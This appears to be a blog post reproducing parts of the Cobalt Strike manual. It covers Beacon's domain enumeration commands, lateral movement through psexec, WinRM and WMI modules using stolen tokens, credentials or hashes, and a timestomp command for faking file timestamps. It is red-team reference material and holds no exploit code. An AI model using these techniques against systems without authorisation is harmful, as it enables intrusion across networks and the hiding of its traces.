![image-20240228124532050](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281245150.png)

![image-20240228124556748](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281245856.png)

### Network and Host Enumeration

Beacon的net模块提供了在Windows域环境下目标发现的工具。

Use **net [pid] [arch] [command] [arguments]** to inject the network and host enumeration tool into the specified process. Use **net [command] [arguments]** (without [pid] and [arch] arguments) to spawn a temporary process and inject the network and host enumeration tool into it. An exception is the **net domain** command which is implemented as a BOF.net domain.

The commands in Beacon’s net module are built on top of the Windows Network Enumeration APIs. Most of these commands are direct replacements for many of the built- in net commands in Windows (there are also a few unique capabilities here as well). The following commands are available:

**computers** - lists hosts in a domain (groups)
**dclist** - lists domain controllers. (populates the targets model) **domain** - display domain for this host
**domain_controllers** - lists DCs in a domain (groups)

**domain_trusts** - lists domain trusts

**group** - lists groups and users in groups

**localgroup** - lists local groups and users in local groups. (great during lateral movement when you have to find who is a local admin on another system).

**logons** - lists users logged onto a host **sessions** - lists sessions on a host **share** - lists shares on a host
 **user** - lists users and user information **time** - show time for a host

**view** - lists hosts in a domain (browser service). (populates the targets model)

### Lateral Movement

Once you have a token for a domain admin or a domain user who is a local admin on a target, you may abuse this trust relationship to get control of the target. Cobalt Strike’s Beacon has several built-in options for lateral movement.

Type **jump** to list lateral movement options registered with Cobalt Strike. Run **jump** **[module] [target] [listener]** to attempt to run a payload on a remote target.

**Post Exploitation /** **Lateral Movement**

| Jump Module | Arch | Description                                 |
| ----------- | ---- | ------------------------------------------- |
| psexec      | x86  | Use a service to run a Service EXE artifact |
| psexec64    | x64  | Use a service to run a Service EXE artifact |
| psexec_psh  | x86  | Use a service to run a PowerShell one-liner |
| winrm       | x86  | Run a PowerShell script via WinRM           |
| winrm64     | x64  | Run a PowerShell script via WinRM           |

Run **remote-exec**, by itself, to list remote execution modules registered with Cobalt Strike. Use **remote-exec [module] [target] [command + args]** to attempt to run the specified command on a remote target.

**Post Exploitation /** **Lateral Movement GUI**

| **Remote-exec Module Description** | Description                                |
| ---------------------------------- | ------------------------------------------ |
| psexec                             | Remote execute via Service Control Manager |
| winrm                              | Remote execute via WinRM (PowerShell)      |
| wmi                                | Remote execute via WMI                     |

Lateral movement is an area, similar to privilege escalation, where some attacks present a natural set of primitives to spawn a session on a remote target. Some attacks give an execute-primitive only. The split between jump and remote-exec gives you flexibility to decide how to weaponize an execute-only primitive.

Aggressor Script has an API to add new modules to jump and remote-exec. See the Aggressor Script documentation (the Beacon chapter, specifically) for more information.

Cobalt Strike also provides a GUI to make lateral movement easier. Switch to the Targets Visualization or go to **View** -> **Targets**. Navigate to **[target]** -> **Jump** and choose your desired lateral movement option.

The following dialog will open:

![image-20240228175116204](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402281751360.png)

First, decide which trust you want to use for lateral movement. If you want to use the token in one of your Beacons, check the *Use session’s current access token* box. If you want to use credentials or hashes for lateral movement—that’s OK too. Select credentials from the credential store or populate the User, Password, and Domain fields. Beacon will use this information to generate an access token for you. Keep in mind, you need to operate from a high integrity context [administrator] for this to work.

Next, choose the listener to use for lateral movement. The SMB Beacon is usually a good candidate here.

Last, select which session you want to perform the lateral movement attack from. Cobalt Strike’s asynchronous model of offense requires each attack to execute from a compromised system.

There is no option to perform this attack without a Beacon session to attack from. If you’re on an internal engagement, consider hooking a Windows system that you control and use that as your starting point to attack other systems with credentials or hashes.

Press **Launch**. Cobalt Strike will activate the tab for the selected Beacon and issue commands to it. Feedback from the attack will show up in the Beacon console.

Other Commands

Beacon has a few other commands not covered above.

The **clear** command will clear Beacon's task list. Use this if you make a mistake.

Type **exit** to ask Beacon to exit.

Use **kill [pid]** to terminate a process.

Use **timestomp** to match the Modified, Accessed, and Created times of one file to those of another file.
